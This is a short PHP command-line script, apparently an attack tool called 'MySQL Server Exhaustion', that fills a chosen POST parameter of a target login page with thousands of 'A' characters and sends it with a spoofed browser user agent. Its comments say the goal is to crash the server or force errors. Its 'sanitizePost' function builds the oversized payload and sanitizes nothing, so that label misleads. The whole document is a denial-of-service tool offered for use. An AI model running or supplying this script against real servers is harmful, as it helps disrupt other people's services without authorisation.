#!/usr/bin/php

<?php

// MySQL Server Exhaustion.
// Many possible outcomes, such as server-crash, or spitting out unwanted errors.

// Sanitize the POST data being sent to the server.

echo "
 _______         __                       __   
|    ___|.--.--.|  |--.---.-.--.--.-----.|  |_ 
|    ___||_   _||     |  _  |  |  |__ --||   _|
|_______||__.__||__|__|___._|_____|_____||____| by DP.\n\n";


function sanitizePost($postdata, $numchars) {
	return str_replace("(%)", str_repeat("A", $numchars), $postdata);
}


// Sending the POST request to the server.
function sendPost($target, $postfields) {

	$curl = curl_init($target);

	CURL_SETOPT($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0");
	CURL_SETOPT($curl, CURLOPT_RETURNTRANSFER, 1);
	CURL_SETOPT($curl, CURLOPT_POST, 1);
	CURL_SETOPT($curl, CURLOPT_POSTFIELDS, $postfields);

	return curl_exec($curl);

}


// The main function.
if(isset($argv[1], $argv[2], $argv[3])) {

	$target = $argv[1];
	$postdata = $argv[2];
	$chars = $argv[3];
	$data = sanitizePost($postdata, $chars);

	echo sendPost($target, $data);

	exit();

}

else {

	echo 'usage: php exhaust.php "http://www.<target>.com/login.php" "username=(%)&password=password" 9001' . "\n";
	echo 'this will send 9001 "A"s to the server within the username POST parameter.' . "\n\n";

	exit();

}

?>
